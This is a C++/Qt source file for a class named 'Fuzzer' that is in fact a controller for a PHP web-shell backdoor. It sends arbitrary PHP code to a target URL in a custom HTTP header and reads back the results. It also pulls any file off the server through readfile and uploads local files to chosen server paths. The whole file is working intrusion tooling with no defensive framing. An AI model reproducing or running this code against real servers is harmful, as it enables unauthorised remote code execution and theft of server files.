#include "Fuzzer.h"

#include <QNetworkReply>
#include <QNetworkAccessManager>
#include <QNetworkRequest>

#include <QHttpPart>
#include <QFile>

#include <QEventLoop>

#include <QMessageBox>

Fuzzer::Fuzzer(QObject *parent, QString h, QString u) : QObject(parent)
{
    this->header = h;
    this->url = u;
    this->response = "WAIT";
    this->gManager = new QNetworkAccessManager(this);
    this->inHeader = true;
}

QString Fuzzer::normalizeRequest(QString r) {
    QString headerResponse;

    if(this->inHeader) {
        headerResponse = "header('" + this->header + ":' . urlencode($r));";
    } else {
        headerResponse = "echo(urlencode($r));";
    }

    return r + headerResponse;
}

void Fuzzer::sendRequest(QString r, bool inHeader)
{
    this->isDownloadRequest = false;
    this->inHeader = inHeader;
    this->request = normalizeRequest(r);

    QNetworkRequest nRequest;
    nRequest.setUrl(QUrl(this->url));
    nRequest.setRawHeader(this->header.toLatin1(), this->request.toLatin1());

    QNetworkReply *nReply;
    nReply = gManager->get(nRequest);

    connect(nReply, SIGNAL(downloadProgress(qint64, qint64)), parent(), SLOT(progressUpdate(qint64, qint64)));
    connect(nReply, SIGNAL(finished()), this, SLOT(handleReturn()), Qt::UniqueConnection);
}

void Fuzzer::downloadFile(QString filePath, QString fileName)
{
    this->isDownloadRequest = true;
    this->request = "$file='" + filePath + fileName + "';header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment');readfile ($file);";

    QNetworkRequest nRequest;
    nRequest.setUrl(QUrl(this->url));
    nRequest.setRawHeader(this->header.toLatin1(), this->request.toLatin1());

    QNetworkReply *nReply;
    nReply = gManager->get(nRequest);

    this->absolutePath = this->downloadDir + fileName;

    file = new QFile;
    file->setFileName(this->absolutePath);
    file->open(QIODevice::WriteOnly);

    connect(nReply, SIGNAL(downloadProgress(qint64, qint64)), parent(), SLOT(progressUpdate(qint64, qint64)));
    connect(nReply, SIGNAL(readyRead()), this, SLOT(onReadyRead()));
    connect(nReply, SIGNAL(finished()), this, SLOT(handleReturn()));
}

QString Fuzzer::uploadFile(QString name, QString localPath, QString serverPath)
{
    QByteArray postData;
    postData = buildUploadString(name, localPath);

    QString bound = "margin"; //name of the boundary

    QString request = "$d='"+serverPath+"';if(move_uploaded_file($_FILES['uploaded']['tmp_name'], $d)){$r='Success!';}else{$r='Error!';}";
    request = normalizeRequest(request);

    QNetworkRequest nRequest;
    nRequest.setUrl(QUrl(url));
    nRequest.setRawHeader(QString("Content-Type").toLatin1(),QString("multipart/form-data; boundary=" + bound).toLatin1());
    nRequest.setRawHeader(QString("Content-Length").toLatin1(), QString::number(postData.length()).toLatin1());
    nRequest.setRawHeader(header.toLatin1(), request.toLatin1());

    connect(gManager, SIGNAL(finished(QNetworkReply*)), this, SLOT(httpRequestFinished(QNetworkReply*)));

    gManager->post(nRequest, postData);

    return "Smth";
}

QByteArray Fuzzer::buildUploadString(QString name, QString localPath)
{
    QString bound="margin";
    QByteArray data(QString("--" + bound + "\r\n").toLatin1());
    data.append("Content-Disposition: form-data; name=\"action\"\r\n\r\n");
    data.append("uploadFile.php\r\n");
    data.append(QString("--" + bound + "\r\n").toLatin1());
    data.append("Content-Disposition: form-data; name=\"uploaded\"; filename=\"up.php\"");
    data.append(name);
    data.append("\"\r\n");
    data.append("Content-Type: text/xml\r\n\r\n"); //data type

    QFile file(localPath);
    if (!file.open(QIODevice::ReadOnly)){
        qDebug() << "QFile Error: File not found!";
        return data;
    } else { qDebug() << "File found, proceed as planned"; }

    data.append(file.readAll());
    data.append("\r\n");
    data.append("--" + bound + "--\r\n");  //closing boundary according to rfc 1867

    file.close();

    return data;
}

void Fuzzer::onReadyRead()
{
    QNetworkReply* reply = qobject_cast<QNetworkReply*>(sender());
    file->write(reply->readAll());
}

void Fuzzer::handleReturn()
{
    QNetworkReply* reply = qobject_cast<QNetworkReply*>(sender());

    if(reply->error() == QNetworkReply::NoError)
    {
        if(this->inHeader) {
            this->response = reply->rawHeader(header.toLatin1());
        } else {
            this->response = reply->readAll();
        }

        this->response = QUrl::fromPercentEncoding(response.toLatin1());
    } else {
        QMessageBox msg;
        msg.setIcon(msg.Critical);
        msg.setText("Erreur lors du chargement : " + reply->errorString());
        msg.exec();

        this->response = "ERROR";
    }

    if(this->isDownloadRequest && file->isOpen())
    {
        file->close();
        file->deleteLater();
    }

    reply->deleteLater();

    emit finishRequest();
}

QString Fuzzer::getResponse()
{
    return this->response;
}

QString Fuzzer::getRequest()
{
    return this->request;
}

QString Fuzzer::getAbsolutePath()
{
    return this->absolutePath;
}
